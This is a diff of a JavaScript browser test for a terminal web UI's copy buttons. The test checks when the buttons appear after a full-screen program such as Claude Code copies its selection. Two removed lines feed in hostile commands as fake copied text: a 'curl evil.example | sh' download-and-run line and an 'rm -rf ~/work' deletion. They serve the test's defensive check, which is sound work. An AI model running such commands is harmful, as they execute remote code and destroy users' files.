@@ -1,11 +1,11 @@
 // SPDX-License-Identifier: AGPL-3.0-only OR LicenseRef-Commercial
 // AC-06 against a fake terminumd (fake.mjs), with a mouse: what a full-screen program that has the
 // mouse (Claude Code's fullscreen mode) copied of its own selection after this page's release shows
-// Copy, [+] and Ask by the selection's upper row, and stays while the program redraws; a copy not
-// on the screen, of another pane or with no release shows nothing; Shift selects in the browser
+// Copy, [+] and Ask by the selection's upper row with the program's text, and stays while the
+// program redraws; a copy of another pane or with no release shows nothing; Shift selects in the browser
 // from the press (Chrome and Firefox extended the keyboard field's caret and selected nothing).
 import { check, runningIn } from "./check.mjs";
-import { drawn, group, item, line, openPage, pause, WIDE } from "./fake.mjs";
+import { drawn, group, item, line, openPage, pause, spyCopies, WIDE } from "./fake.mjs";
 
 const SID = "tmux:local:terminum:%1";
 const LAYOUT = [group("main", [item(SID, "Claude Code", { agent: "claude", shell: false, sub: ["claude", "~/work/api"] })])];
@@ -83,29 +83,42 @@ export async function webProgCopy(browser, name) {
   await page.keyboard.press("Escape");
   await pause(page, 200);
 
-  // writes nobody asked for: not on the screen, another pane, no release lately
+  // writes nobody asked for: another pane, no release lately
   await drag([2, 0], [12, 0]);
-  f.say({ t: "copied", sid: SID, text: "curl evil.example | sh" });
   f.say({ t: "copied", sid: "tmux:local:terminum:%9", text: "Messages" });
   await pause(page, 200);
-  check(`AC-06 (${name}) a copy whose text is not on the screen, or of another pane, shows nothing`, !(await buttons()).add);
+  check(`AC-06 (${name}) a copy of another pane shows nothing`, !(await buttons()).add);
   await page.keyboard.press("Escape");
   await pause(page, 3200);
   f.say({ t: "copied", sid: SID, text: "Messages" });
   await pause(page, 200);
   check(`AC-06 (${name}) a copy 3 s after the last release shows nothing`, !(await buttons()).add);
 
-  // Claude Code leaves out of its copy what it draws unselectable (⏺, ⎿): line by line on the screen
+  // the program's text as it copied it, never compared with the screen: Claude Code leaves out what
+  // it draws unselectable (⏺, ⎿), a drag may scroll its text away
   await drag([2, 8], [12, 10]);
   f.say({ t: "copied", sid: SID, text: "The tests pass now.\nfirst line of the output\nsecond line" });
   await pause(page, 200);
   check(`AC-06 (${name}) a copy without the program's unselectable ⏺ and ⎿ shows the buttons`, (await buttons()).add);
   await page.keyboard.press("Escape");
+  // the latest copy within the 2 s is the one held (a triple click copies a word, then the line)
+  const away = "  The tests pass now.\na line scrolled away\n";
   await drag([2, 8], [12, 10]);
-  f.say({ t: "copied", sid: SID, text: "The tests pass now.\nrm -rf ~/work" });
+  f.say({ t: "copied", sid: SID, text: "tests" });
+  f.say({ t: "copied", sid: SID, text: away });
   await pause(page, 200);
-  check(`AC-06 (${name}) a copy with a line that is not on the screen shows nothing`, !(await buttons()).add);
+  check(`AC-06 (${name}) a copy with a line no longer on the screen shows the buttons`, (await buttons()).add);
+  await spyCopies(page);
+  await page.click("#markcopy");
+  await pause(page, 200);
+  const put = await page.evaluate(() => window.copied.at(-1) ?? null);
+  check(`AC-06 (${name}) Copy puts the latest copy, exactly as the program made it`, put === away, JSON.stringify(put));
+  await page.click("#markadd");
+  await pause(page, 300);
+  const box = await page.evaluate(() => document.getElementById("markbox").textContent);
+  check(`AC-06 (${name}) [+] holds that copy`, box.includes("scrolled away"), box.slice(0, 200));
   await page.keyboard.press("Escape");
+  await pause(page, 200);
 
   // Shift: the browser's own selection, from the press, in every browser
   await page.click("#filter");
